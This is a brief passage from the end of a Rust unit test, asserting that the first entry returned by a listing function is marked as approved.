            &now,
        )
        .unwrap();
        assert!(list(&st, dir.path(), &cfg, &[])[0].approved);
    }
}
